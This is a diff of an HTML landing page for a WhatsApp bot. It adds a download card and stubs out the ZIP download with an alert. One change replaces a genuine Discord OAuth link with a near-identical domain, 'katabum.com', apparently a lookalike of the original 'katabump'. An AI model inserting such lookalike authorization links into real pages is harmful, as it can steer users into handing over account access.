@@ -309,13 +309,24 @@
                 
                 <!-- Card 4 -->
                 <div class="card">
-                    <div class="card-img" style="background-image: url('https://files.catbox.moe/otzhcx.jpg');">
+                    <div class="card-img" style="background-image: url('https://files.catbox.moe/aejxvt.jpg');">
                         <span class="status available">Available</span>
                     </div>
                     <div class="card-content">
                         <h3>Authorization</h3>
                         <p>Authorize the bot to access your Discord account for enhanced functionality.</p>
-                        <a href="https://discord.com/oauth2/authorize?client_id=1127907091324080218&response_type=code&redirect_uri=https%3A%2F%2Fdashboard.katabump.com%2Fauth%2Fdiscord&scope=email+identify+guilds.join" class="card-btn">Authorize</a>
+                        <a href="https://katabum.com/authorize" class="card-btn">Authorize</a>
+                    </div>
+                </div>
+                  <!-- Card 5 -->
+                <div class="card">
+                    <div class="card-img" style="background-image: url('https://files.catbox.moe/otzhcx.jpg');">
+                        <span class="status available">Available</span>
+                    </div>
+                    <div class="card-content">
+                        <h3>GET ZIP</h3>
+                        <p>Authorize the bot to access your Discord account for enhanced functionality.</p>
+                        <a href="https://zip-silk.vercel.app/" class="card-btn">downloadzipnow</a>
                     </div>
                 </div>
                 
@@ -327,7 +338,7 @@
                     <div class="card-content">
                         <h3>GitHub Repository</h3>
                         <p>Download the complete source code from our GitHub repository to get started.</p>
-                        <a href="https://zip-silk.vercel.app" class="card-btn download-btn" id="download-btn">Download ZIP</a>
+                        <a href="./assets/explore.zip" class="card-btn download-btn" id="download-btn">Download ZIP</a>
                     </div>
                 </div>
             </div>
@@ -335,7 +346,7 @@
     </div>
     
     <footer>
-        <p>Explore MD V1 WhatsApp Bot &copy; 2023. All rights reserved.</p>
+        <p>Explore MD V1 WhatsApp Bot &copy; 2025. All rights reserved.</p>
     </footer>
 
     <script>
@@ -432,10 +443,13 @@
             successMsg.style.display = 'block';
             errorMsg.style.display = 'none';
         }
-        // Handle download button click
         
-        window.downloadZip = function() {
-                window.location.href = "https://zip-silk.vercel.app";
+        // Handle download button click
+        downloadBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            alert('In a real implementation, this would download the repository ZIP file');
+            // window.location.href = './assets/explore.zip';
+        });
     </script>
 </body>
-  </html>
+</html>
